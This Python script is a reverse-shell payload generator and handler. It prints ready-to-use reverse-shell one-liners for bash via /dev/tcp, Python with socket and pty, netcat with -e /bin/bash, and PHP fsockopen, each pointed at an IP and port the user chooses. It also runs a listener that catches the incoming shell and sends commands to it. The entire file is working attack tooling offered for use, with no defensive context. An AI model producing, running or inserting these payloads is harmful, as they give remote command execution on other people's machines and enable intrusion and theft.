import sys
import socket
import argparse

def generate_payloads(ip, port):
    return {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
        "nc": f"nc {ip} {port} -e /bin/bash",
        "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    }

def start_listener(port):
    print(f"\n[*] Starting Reverse Shell Listener on port {port}...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[+] Listening for incoming connections on port {port}...")
    print("[*] Waiting for target to execute payload...")
    try:
        conn, addr = server.accept()
        print(f"\n[!] CONNECTION ESTABLISHED from {addr[0]}:{addr[1]}")
        conn.settimeout(2.0)
        while True:
            try:
                data = conn.recv(4096)
                if data:
                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
            except socket.timeout:
                pass
            
            cmd = input()
            if cmd.lower() in ["exit", "quit"]:
                break
            if cmd.strip():
                conn.sendall((cmd + "\n").encode())
    except Exception as e:
        print(f"[-] Listener error: {e}")
    finally:
        server.close()
        print("[*] Listener closed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell Payload Generator & Handler")
    parser.add_argument("--ip", default="127.0.0.1", help="Listener IP")
    parser.add_argument("--port", type=int, default=4444, help="Listener Port")
    parser.add_argument("--listen", action="store_true", help="Start local listener")
    args = parser.parse_args()

    print("=" * 65)
    print(" [*] REVERSE SHELL PAYLOAD GENERATOR & HANDLER")
    print("=" * 65)
    payloads = generate_payloads(args.ip, args.port)
    for ptype, pval in payloads.items():
        print(f" [+] {ptype.upper()} Payload:\n     {pval}\n")

    if args.listen:
        start_listener(args.port)
